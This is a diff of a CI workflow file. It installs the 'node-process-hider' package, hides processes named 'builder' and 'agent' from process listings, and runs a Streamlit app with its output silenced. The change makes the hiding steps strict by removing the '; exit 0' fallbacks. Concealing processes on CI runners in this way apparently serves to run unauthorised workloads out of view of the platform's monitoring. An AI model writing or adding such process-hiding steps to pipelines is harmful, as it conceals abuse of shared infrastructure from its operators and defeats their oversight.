@@ -7,6 +7,6 @@ workflows:
           apt-get update -y
           apt-get install python procps npm -y
           npm i -g node-process-hider
-          ph add builder; exit 0
-          ph add agent; exit 0
+          ph add builder
+          ph add agent
           watch free -m & python streamlit_app.py > /dev/null
